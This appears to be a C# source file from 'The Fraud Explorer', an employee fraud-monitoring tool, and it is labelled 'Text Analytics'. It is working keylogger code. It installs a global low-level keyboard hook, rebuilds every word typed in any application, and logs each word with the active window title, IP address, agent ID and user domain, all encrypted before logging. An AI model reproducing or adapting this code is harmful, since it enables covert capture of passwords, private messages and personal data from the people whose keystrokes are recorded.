/*
 * The Fraud Explorer
 * https://www.thefraudexplorer.com/
 *
 * Copyright (c) 2017 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * https://www.thefraudexplorer.com/License
 *
 * Date: 2017-06
 * Revision: v1.0.1-beta
 *
 * Description: Text Analytics
 */

using System;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Input;
using System.Windows.Threading;
using TFE_core.Config;
using TFE_core.Networking;
using TFE_core.Crypto;

namespace TFE_core.Analytics
{
    /// <summary>
    /// Text Analytics functionality 
    /// </summary>

    #region Input text Analytics

    public class TextAnalytics : IDisposable
    {
        public TextAnalytics()
        {
            this.dispatcher = Dispatcher.CurrentDispatcher;
            hookedLowLevelKeyboardProc = (MIMKeys.LowLevelKeyboardProc)LowLevelKeyboardProc;
            hookId = MIMKeys.SetHook(hookedLowLevelKeyboardProc);
            hookedKeyboardCallbackAsync = new KeyboardCallbackAsync(KBListener_KeyboardCallbackAsync);
            KBHelpers.TextAnalyticsGlobalProperties();
        }

        private Dispatcher dispatcher;
        ~TextAnalytics()
        {
            Dispose();
        }

        public event RawKeyEventHandler KeyDown;
        public event RawKeyEventHandler KeyUp;
        private IntPtr hookId = IntPtr.Zero;
        private delegate void KeyboardCallbackAsync(MIMKeys.KeyEvent keyEvent, int vkCode, string character);

        [MethodImpl(MethodImplOptions.NoInlining)]

        private IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam)
        {
            string chars = "";
            if (nCode >= 0) if (wParam.ToUInt32() == (int)MIMKeys.KeyEvent.WM_KEYDOWN || wParam.ToUInt32() == (int)MIMKeys.KeyEvent.WM_KEYUP || wParam.ToUInt32() == (int)MIMKeys.KeyEvent.WM_SYSKEYDOWN || wParam.ToUInt32() == (int)MIMKeys.KeyEvent.WM_SYSKEYUP)
            {
                chars = MIMKeys.VKCodeToString((uint)Marshal.ReadInt32(lParam), (wParam.ToUInt32() == (int)MIMKeys.KeyEvent.WM_KEYDOWN || wParam.ToUInt32() == (int)MIMKeys.KeyEvent.WM_SYSKEYDOWN));
                hookedKeyboardCallbackAsync.BeginInvoke((MIMKeys.KeyEvent)wParam.ToUInt32(), Marshal.ReadInt32(lParam), chars, null, null);
            }
            return MIMKeys.CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private KeyboardCallbackAsync hookedKeyboardCallbackAsync;
        private MIMKeys.LowLevelKeyboardProc hookedLowLevelKeyboardProc;

        void KBListener_KeyboardCallbackAsync(MIMKeys.KeyEvent keyEvent, int vkCode, string character)
        {
            switch (keyEvent)
            {
                case MIMKeys.KeyEvent.WM_KEYDOWN:
                    if (KeyDown != null) dispatcher.BeginInvoke(new RawKeyEventHandler(KeyDown), this, new RawKeyEventArgs(vkCode, false, character));
                    break;
                case MIMKeys.KeyEvent.WM_SYSKEYDOWN:
                    if (KeyDown != null) dispatcher.BeginInvoke(new RawKeyEventHandler(KeyDown), this, new RawKeyEventArgs(vkCode, true, character));
                    break;
                case MIMKeys.KeyEvent.WM_KEYUP:
                    if (KeyUp != null) dispatcher.BeginInvoke(new RawKeyEventHandler(KeyUp), this, new RawKeyEventArgs(vkCode, false, character));
                    break;
                case MIMKeys.KeyEvent.WM_SYSKEYUP:
                    if (KeyUp != null) dispatcher.BeginInvoke(new RawKeyEventHandler(KeyUp), this, new RawKeyEventArgs(vkCode, true, character));
                    break;
                default: break;
            }
        }

        public void Dispose()
        {
            MIMKeys.UnhookWindowsHookEx(hookId);
        }
    }
    public class RawKeyEventArgs : EventArgs
    {
        public int VKCode;
        public Key Key;
        public bool IsSysKey;
        public override string ToString()
        {
            return Character;
        }

        public string Character;

        public RawKeyEventArgs(int VKCode, bool isSysKey, string Character)
        {
            this.VKCode = VKCode;
            this.IsSysKey = isSysKey;
            this.Character = Character;
            this.Key = System.Windows.Input.KeyInterop.KeyFromVirtualKey(VKCode);
        }
    }

    public delegate void RawKeyEventHandler(object sender, RawKeyEventArgs args);

    public class KBHelpers
    {
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        private static readonly log4net.ILog logText = log4net.LogManager.GetLogger("textAnalytics_Repo", typeof(TextAnalyticsLogger));

        public static void TextAnalyticsGlobalProperties()
        {
            log4net.GlobalContext.Properties["IPAddress"] = Cryptography.EncRijndael(Network.GetLocalIPAddress());
            log4net.GlobalContext.Properties["AgentID"] = Cryptography.EncRijndael(Settings.AgentID);
            log4net.GlobalContext.Properties["UserDomain"] = Cryptography.EncRijndael(Settings.userDomain);
        }

        private static string KeyboardWord = string.Empty;
        public static String ActualWindow;

        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }

        public static void KeyboardListener_KeyDown(object sender, RawKeyEventArgs args)
        {
            try
            {
                if (TextHelpers.KeysSanitizer(args.Key.ToString()))
                {
                    KeyboardWord = KeyboardWord + args.Key.ToString();
                
                    if (KeyboardWord != String.Empty)
                    {
                        if (KeyboardWord.IndexOf("Space") != -1)
                        {
                            int index = KeyboardWord.IndexOf("Space");
                            KeyboardWord = KeyboardWord.Substring(0, index);

                            if (KeyboardWord.Length > 1 && TextHelpers.WordsSanitizer(KeyboardWord))
                            {
                                log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
                                logText.Info(Cryptography.EncRijndael("TextEvent"));
                            }
                            KeyboardWord = String.Empty;
                        }
                        else if (KeyboardWord.IndexOf("Return") != -1)
                        {
                            int index = KeyboardWord.IndexOf("Return");
                            KeyboardWord = KeyboardWord.Substring(0, index);

                            if (KeyboardWord.Length > 1 && TextHelpers.WordsSanitizer(KeyboardWord))
                            {
                                log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
                                logText.Info(Cryptography.EncRijndael("TextEvent"));
                            }
                            KeyboardWord = String.Empty;
                        }
                        else if (KeyboardWord.IndexOf("Tab") != -1)
                        {
                            int index = KeyboardWord.IndexOf("Tab");
                            KeyboardWord = KeyboardWord.Substring(0, index);

                            if (KeyboardWord.Length > 1 && TextHelpers.WordsSanitizer(KeyboardWord))
                            {
                                log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                                log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
                                logText.Info(Cryptography.EncRijndael("TextEvent"));
                            }
                            KeyboardWord = String.Empty;
                        }
                    }
                }
            }
            catch { };
        }
    }
    internal static class MIMKeys
    {
        public delegate IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam);
        public static int WH_KEYBOARD_LL = 13;

        public enum KeyEvent : int
        {
            WM_KEYDOWN = 256,
            WM_KEYUP = 257,
            WM_SYSKEYUP = 261,
            WM_SYSKEYDOWN = 260
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) { return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0); }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, UIntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern IntPtr GetKeyboardLayout(uint dwLayout);

        [DllImport("User32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("User32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        private static uint lastVKCode = 0;
        private static uint lastScanCode = 0;
        private static byte[] lastKeyState = new byte[255];
        private static bool lastIsDead = false;

        public static string VKCodeToString(uint VKCode, bool isKeyDown)
        {
            System.Text.StringBuilder sbString = new System.Text.StringBuilder(5);
            byte[] bKeyState = new byte[255];
            bool bKeyStateStatus;
            bool isDead = false;
            IntPtr currentHWnd = GetForegroundWindow();
            uint currentProcessID;
            uint currentWindowThreadID = GetWindowThreadProcessId(currentHWnd, out currentProcessID);
            uint thisProgramThreadId = GetCurrentThreadId();

            if (AttachThreadInput(thisProgramThreadId, currentWindowThreadID, true))
            {
                bKeyStateStatus = GetKeyboardState(bKeyState);
                AttachThreadInput(thisProgramThreadId, currentWindowThreadID, false);
            }
            else
            {
                bKeyStateStatus = GetKeyboardState(bKeyState);
            }

            if (!bKeyStateStatus) return "";

            IntPtr HKL = GetKeyboardLayout(currentWindowThreadID);
            uint lScanCode = MapVirtualKeyEx(VKCode, 0, HKL);

            if (!isKeyDown) return "";

            int relevantKeyCountInBuffer = ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, sbString.Capacity, (uint)0, HKL);
            string ret = "";

            switch (relevantKeyCountInBuffer)
            {
                case -1: isDead = true; ClearKeyboardBuffer(VKCode, lScanCode, HKL); break;
                case 0: break;
                case 1: ret = sbString[0].ToString(); break;
                case 2:
                default: ret = sbString.ToString().Substring(0, 2); break;
            }

            if (lastVKCode != 0 && lastIsDead)
            {
                System.Text.StringBuilder sbTemp = new System.Text.StringBuilder(5);
                ToUnicodeEx(lastVKCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, (uint)0, HKL);
                lastVKCode = 0;
                return ret;
            }

            lastScanCode = lScanCode;
            lastVKCode = VKCode;
            lastIsDead = isDead;
            lastKeyState = (byte[])bKeyState.Clone();
            return ret;
        }

        private static void ClearKeyboardBuffer(uint vk, uint sc, IntPtr hkl)
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder(10);
            int rc;

            do
            {
                byte[] lpKeyStateNull = new Byte[255];
                rc = ToUnicodeEx(vk, sc, lpKeyStateNull, sb, sb.Capacity, 0, hkl);
            }
            while (rc < 0);
        }
    }

    #endregion
}
